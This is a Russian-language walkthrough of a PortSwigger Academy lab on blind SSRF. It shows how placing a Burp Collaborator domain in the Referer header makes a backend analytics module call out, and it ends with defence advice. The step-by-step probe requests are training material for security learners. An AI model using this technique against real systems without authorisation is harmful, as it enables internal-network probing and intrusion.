# 📘 PortSwigger Lab: Blind SSRF with out-of-band detection

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-blind-ssrf-vulnerabilities/ssrf/blind/lab-out-of-band-detection  
> 🎯 Тема: Server-Side Request Forgery (SSRF) — обнаружение Blind SSRF через OAST (Burp Collaborator)  
> 🧪 Уровень: Practitioner  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [📡 Что такое Blind SSRF и OAST](#oast)
- [🌐 Роль заголовка Referer](#referer)
- [⚡ Асинхронная обработка на бэкенде](#async)
- [🔍 Шаг 1 — Перехватить запрос к карточке товара](#step1)
- [🔍 Шаг 2 — Сгенерировать пейлоад в Burp Collaborator](#step2)
- [🔍 Шаг 3 — Вставить пейлоад в заголовок Referer](#step3)
- [🔍 Шаг 4 — Отправить запрос и проверить логи (Poll)](#step4)
- [🔍 Шаг 5 — Зафиксировать DNS и HTTP события](#step5)
- [📨 Примеры перехваченных запросов](#examples)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Использовать механизм отслеживания аналитики страницы товара для:

```text
1. Обнаружения уязвимости Blind SSRF через заголовок Referer.
2. Принуждения бэкенд-модуля аналитики выполнить out-of-band HTTP-запрос к Burp Collaborator.
3. Решения лаборатории путем фиксации внешнего взаимодействия.
```

<a id="theory"></a>

🧠 Краткая теория
В классическом (In-band) SSRF сервер выполняет HTTP-запрос и возвращает ответ целевого ресурса клиенту. В Blind SSRF сервер инициирует исходящий сетевой запрос к заданному адресу, однако ответ сервера никогда не возвращается во фронтенд-интерфейс.

Типичные сценарии возникновения Blind SSRF:

```text
- Сбор серверной аналитики и отслеживание источников трафика.
- Обработчики вебхуков и пингбэков (pingbacks).
- Парсеры метатегов (OpenGraph) и предпросмотр ссылок.
- Генераторы PDF и конвертеры документов.
Поскольку в HTTP-ответе нет никаких следов исполнения запроса, единственным надежным способом обнаружения является техника OAST (Out-of-band Application Security Testing) с использованием внешнего слушателя, такого как Burp Collaborator.
```

<a id="idea"></a>

🧩 Ключевая идея
Приложение читает значение стандартного заголовка Referer для сбора статистики. Вместо обработки заголовка как текстовой строки бэкенд инициирует исходящий HTTP-запрос по переданному URL.

```text
Атакующий шлет:    Referer: https://xyz.oastify.com
Модуль аналитики:  Парсит Referer -> Резолвит DNS -> Отправляет HTTP GET на xyz.oastify.com
Collaborator:      Логирует DNS Query + HTTP GET запрос ✅
```

<a id="oast"></a>

📡 Что такое Blind SSRF и OAST
Blind SSRF означает, что уязвимость работает исключительно в «одностороннем» режиме без отображения данных во фронтенд-ответе.

OAST (Out-of-band Application Security Testing) — подход, при котором уязвимость подтверждается фиксацией сетевых взаимодействий на внешнем контролируемом сервере:

```text
- DNS-запросы: Сервер обязан сначала узнать IP-адрес хоста через DNS. Исходящий DNS-трафик часто разрешен даже при строгой фильтрации.
- HTTP-запросы: Если Egress-правила сети разрешают исходящие соединения, сервер обратится к listener'у по протоколам HTTP/HTTPS.
```

<a id="referer"></a>

🌐 Роль заголовка Referer
Заголовок Referer передается браузером и указывает адрес ресурса, с которого был совершен переход на текущую страницу.

Разработчики часто исходят из ошибочного предположения:

```text
«HTTP-заголовки передаются браузером и являются метаданными, а не опасным пользовательским вводом».
Любой HTTP-заголовок может быть произвольно изменен клиентом. Заголовки Referer, User-Agent, X-Forwarded-For часто выступают входными векторами для скрытых SSRF-инъекций.
```

<a id="async"></a>

⚡ Асинхронная обработка на бэкенде
Задачи аналитики ресурсоемки, поэтому их нередко выносят в фоновые очереди задач (Celery, RabbitMQ, Kafka).

Особенности обработки:

```text
- Основной HTTP-ответ 200 OK возвращается пользователю мгновенно.
- Сам SSRF-запрос инициируется фоновым воркером спустя несколько секунд.
- Опрос логов Collaborator необходимо выполнять с небольшой временной задержкой.
```

<a id="step1"></a>

🔍 Шаг 1 — Перехватить запрос к карточке товара
Открыть страницу любого товара в лабораторной.

Включить перехват в Burp Proxy (Intercept on).

Обновить страницу карточки товара.

Перехватить запрос:

http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
User-Agent: Mozilla/5.0 ...
Referer: https://LAB-ID.web-security-academy.net/
Отправить запрос в Repeater (Ctrl + R).

<a id="step2"></a>

🔍 Шаг 2 — Сгенерировать пейлоад в Burp Collaborator
Перейти во вкладку Collaborator в Burp Suite.

Нажать кнопку Copy to clipboard, чтобы получить уникальный субдомен:

```text
YOUR-SUBDOMAIN.oastify.com
(Также можно прямо в окне Repeater выделить значение заголовка, кликнуть правой кнопкой мыши и выбрать «Insert Collaborator Payload»).
```

<a id="step3"></a>

🔍 Шаг 3 — Вставить пейлоад в заголовок Referer
В окне Repeater найти заголовок Referer.

Заменить исходный URL на сгенерированный субдомен Collaborator:

http
Referer: https://YOUR-SUBDOMAIN.oastify.com
<a id="step4"></a>

🔍 Шаг 4 — Отправить запрос и проверить логи (Poll)
Нажать Send в Repeater.

Убедиться, что сервер вернул стандартный ответ 200 OK с содержимым карточки товара.

Перейти во вкладку Collaborator.

Нажать кнопку Poll now.

<a id="step5"></a>

🔍 Шаг 5 — Зафиксировать DNS и HTTP события
Через пару секунд в таблице взаимодействий Collaborator появятся события:

```text
Type     Time                      Client IP       Details
DNS      2026-08-17 13:49:00 UTC   x.x.x.x         Name: YOUR-SUBDOMAIN.oastify.com (A)
HTTP     2026-08-17 13:49:01 UTC   x.x.x.x         Request: GET / HTTP/1.1
Наличие входящего HTTP-запроса подтверждает, что бэкенд успешно обратился к внешнему серверу.

Лаборатория переходит в статус:

text
Solved
```

<a id="examples"></a>

📨 Примеры перехваченных запросов
Исходный запрос (легитимный)
http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Referer: https://LAB-ID.web-security-academy.net/
Connection: close
Модифицированный запрос (пейлоад в Repeater)
http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Referer: https://BURP-COLLABORATOR-SUBDOMAIN.oastify.com
Connection: close
<a id="response"></a>

📥 Пример результата
Ответ приложения в Repeater (немой ответ)
http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 4321
Connection: close

<!DOCTYPE html>
<html>
    <head><title>Product Details</title></head>
    <body>
        <h1>Product 1</h1>
        <p>Product details displayed normally...</p>
    </body>
</html>
Зафиксированные события в Burp Collaborator
```text
[+] DNS Query:
    Lookup: Type A for BURP-COLLABORATOR-SUBDOMAIN.oastify.com
    Source IP: <PortSwigger DNS Internal Lab Resolver>

[+] HTTP Request:
    Method: GET
    Path: /
    Host: BURP-COLLABORATOR-SUBDOMAIN.oastify.com
    User-Agent: Java/17.0.x (внутренний аналитический краулер)
Статус лаборатории:

text
Solved
```

<a id="attack-chain"></a>

🧾 Полная цепочка атаки
```text
1. Открыть карточку товара и перехватить GET /product?productId=1
2. Отправить запрос в Repeater
3. Сгенерировать субдомен Burp Collaborator (например, xyz.oastify.com)
4. Заменить значение заголовка Referer на https://xyz.oastify.com
5. Отправить модифицированный запрос
6. Бэкенд асинхронно передает URL парсеру аналитики
7. Сервер аналитики резолвит DNS и отправляет HTTP GET запрос на Collaborator
8. Нажать "Poll now" в Collaborator и зафиксировать входящие события
9. Лаборатория помечена как Solved
```

<a id="breakdown"></a>

🔬 Почему атака сработала
1. Отсутствие валидации заголовков
Модуль аналитики слепо доверял значению заголовка Referer, считая его легитимным URL для перехода.

2. Автоматический переход по ссылкам
HTTP-клиент на бэкенде не ограничивал целевые хосты и схемы при обработке ссылок из заголовка Referer.

3. Разрешенный исходящий трафик (Egress)
Сетевая инфраструктура целевого сервера позволяла совершать исходящие HTTP-соединения во внешнюю сеть.

<a id="pentester"></a>

🧠 Как думать как пентестер
При аудите приложений на Blind SSRF:

```text
Проверены ли неочевидные заголовки (Referer, User-Agent, X-Forwarded-For, Forwarded)?
text
Есть ли в приложении вебхуки, загрузка аватарок по URL, экспорт в PDF или генерация превью ссылок?
text
Выполняется ли задача асинхронно? Всегда делайте паузу перед проверкой логов OAST.
text
Пришел только DNS или полноценный HTTP? DNS доказывает инъекцию, даже если фаервол заблокировал HTTP.
```

<a id="mistakes"></a>

❌ Типичные ошибки
Ошибка 1. Искать подтверждение в ответе Repeater
При Blind SSRF ответ сервера никогда не содержит данных запроса. Результат проверяется только в логах Collaborator.

Ошибка 2. Слишком быстрый опрос Collaborator
Так как обработка аналитики асинхронна, подождите 3–5 секунд перед нажатием кнопки Poll now.

Ошибка 3. Использование сторонних доменов и IP
Платформа PortSwigger Academy блокирует обращения к произвольным внешним адресам. Для выполнения лаб необходимо использовать домены Burp Collaborator.

Ошибка 4. Некорректный синтаксис URL
Заголовок Referer должен содержать корректную схему (http:// или https://).

<a id="defense"></a>

🛡 Защита
1. Отказ от лишних исходящих запросов
Не загружать URL из клиентских заголовков, если это не обусловлено прямой бизнес-логикой.

2. Строгий Allowlist доменов
Если проверка источников перехода необходима, валидировать домены по белому списку доверенных хостов.

3. Фильтрация исходящего сетевого трафика (Egress Filtering)
Блокировать серверу приложений возможность инициировать соединения с произвольными внешними IP и портами.

4. Изоляция сервисов обработки ссылок
Выносить модули краулинга и парсинга ссылок в изолированные контейнеры/песочницы без доступа к внутренней инфраструктуре.

<a id="checklist"></a>

✅ Чек-лист
Разведка
- [ ] Открыта карточка товара
- [ ] Перехвачен запрос GET /product?productId=X
- [ ] Запрос отправлен в Repeater
Генерация пейлоада
- [ ] Открыта вкладка Burp Collaborator
- [ ] Скопирован уникальный субдомен Collaborator
Эксплуатация
- [ ] Пейлоад вставлен в заголовок Referer
- [ ] Запрос отправлен через Repeater
- [ ] Нажата кнопка «Poll now» в Collaborator
- [ ] Зафиксированы DNS- и HTTP-запросы
- [ ] Лаборатория получила статус Solved
<a id="conclusion"></a>

🧾 Итог
Лаборатория решена путем обнаружения Blind SSRF с использованием техники OAST:

```text
1. Внедрен домен Collaborator в заголовок Referer
2. Инициирован асинхронный фоновый запрос со стороны аналитического ПО сервера
3. Факт уязвимости подтвержден через DNS и HTTP логи в Burp Collaborator
Главные выводы:

text
Blind SSRF не возвращает данные в HTTP-ответе — для детекта необходим OAST.
text
HTTP-заголовки (Referer, User-Agent) являются полноценными точками входа для SSRF.
text
Даже без прямого чтения ответов Blind SSRF опасен как вектор RCE и разведки внутренней сети.
```

[⬆ Back to top](#top)
